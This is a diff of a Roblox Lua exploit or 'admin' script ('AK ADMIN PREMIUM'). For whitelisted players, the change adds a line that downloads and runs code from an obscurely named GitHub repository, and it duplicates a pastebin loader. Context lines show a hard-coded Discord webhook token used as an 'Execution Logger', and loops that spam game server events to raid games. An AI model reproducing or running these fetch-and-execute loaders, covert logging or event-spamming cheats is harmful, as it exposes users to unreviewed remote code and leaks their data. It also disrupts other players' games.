@@ -1,3 +1,4 @@
+
 local player = game.Players.LocalPlayer
 local playerID = player.UserId
 local whitelistedPlayers = {
@@ -45,7 +46,8 @@ if not isPlayerWhitelisted(playerID) then
     print("You are not whitelisted. Execute non-whitelisted logic here.")
 else
     showNotification("You are Whitelisted. Enjoy AK ADMIN PREMIUM.", Color3.fromRGB(0, 255, 0))
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/antilogger"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JSFKGBASDJKHIOAFHDGHIUODSGBJKLFGDKSB/kdjnvlkfns-kldjbncfkbn-vklnbcv-n/main/cmdbar"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/2kyjCzkA"))()
 local url = "https://discord.com/api/webhooks/1164998378275483740/jzxVS5JG0Be1EbKTMFTRo5wQ3yXx2MjEHZUBaUqulXWGpXZoVcS5qcSpK-sTQ6Bfh4ac"
 local botname = "Execution Logger"
@@ -714,7 +716,6 @@ Notification:Notify(
                             print("Boombox Raid Loop is now OFF")
                         end
                     end
-
                     game:GetService("Players").LocalPlayer.Chatted:Connect(processChatCommand)
                     local function raidLoop()
                         while true do
@@ -728,13 +729,10 @@ Notification:Notify(
                                     end
                                 end
                             end
-
                             if isKittyRaidLooping then game.ReplicatedStorage.GiveCat:FireServer() end
                             if isBoomboxRaidLooping then game.ReplicatedStorage.GiveBox:FireServer() end
                         end
                     end
-
-               
                     raidLoop() -- Start the raid loop
                 end
             )
